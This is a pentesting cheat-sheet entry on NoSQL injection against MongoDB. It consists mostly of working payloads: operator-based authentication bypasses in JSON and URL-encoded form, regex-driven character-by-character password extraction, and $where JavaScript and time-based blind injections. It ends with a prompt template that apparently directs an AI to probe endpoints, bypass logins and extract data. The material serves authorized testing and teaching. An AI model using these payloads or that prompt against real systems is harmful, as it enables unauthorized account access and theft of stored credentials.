---
id: "nosql-injection"
title: "NoSQL Injection - MongoDB, CouchDB, Redis"
type: "technique"
category: "web-application"
subcategory: "sqli"
tags: ["nosql", "mongodb", "injection", "auth-bypass", "data-extraction", "operator-injection"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["sqli-payloads", "idor-bola"]
updated: "2026-03-30"
---

## Overview

NoSQL injection exploits query logic in document databases (MongoDB, CouchDB) by injecting operators or JavaScript. Unlike SQL injection, there's no standard query language — techniques are database-specific. Found in Node.js/Express apps using MongoDB, serverless functions, and any JSON-based API.

## MongoDB Operator Injection

### Authentication Bypass
```json
// Normal login: {"username":"admin","password":"secret"}
// Injected: password is always true

{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$regex":"admin"},"password":{"$ne":""}}

// URL-encoded (for GET params or form data)
username=admin&password[$ne]=
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=^admin&password[$gt]=
```

### Data Extraction via $regex
```json
// Extract password character by character
{"username":"admin","password":{"$regex":"^a"}}    // true/false
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^abc"}}
// Binary search through charset to extract full password
```

### Operator Injection
```json
// $where — JavaScript execution
{"$where":"this.username=='admin' && this.password=='x' || 1==1"}
{"$where":"sleep(5000)"}  // Time-based blind

// $lookup — cross-collection data access
// $group, $unwind — aggregation pipeline injection
```

## JavaScript Injection (Server-Side)

```javascript
// If the app uses eval() or $where with user input
// In MongoDB $where:
this.password == 'x'; return true; var x='
// Or:
'; sleep(5000); var x='    // Time-based detection

// Node.js specific
// If input is parsed as JSON and passed directly to MongoDB:
req.body.username  // Could be {"$gt":""} instead of a string
```

## Blind NoSQL Injection

### Boolean-based
```
# True condition (valid response)
{"username":"admin","password":{"$regex":"^a"}}

# False condition (error/different response)
{"username":"admin","password":{"$regex":"^z"}}

# Automate: iterate through characters to extract data
```

### Time-based
```json
{"username":"admin","$where":"if(this.password.match(/^a/)){sleep(5000)}else{return false}"}
```

## Deep Dig Prompts

```
Given this API endpoint that likely uses MongoDB [describe]:
1. Test operator injection in every parameter (replace string values with {"$ne":""}).
2. Attempt auth bypass with $ne, $gt, and $regex operators.
3. If blind injection works, use $regex to extract data character by character.
4. Test for $where JavaScript injection (time-based detection).
5. Check if input type enforcement is missing (string vs object).
```

## Tools

- **NoSQLMap** — Automated NoSQL injection
- **Burp Suite** — Manual JSON manipulation
- **mongosh** — MongoDB shell for payload testing
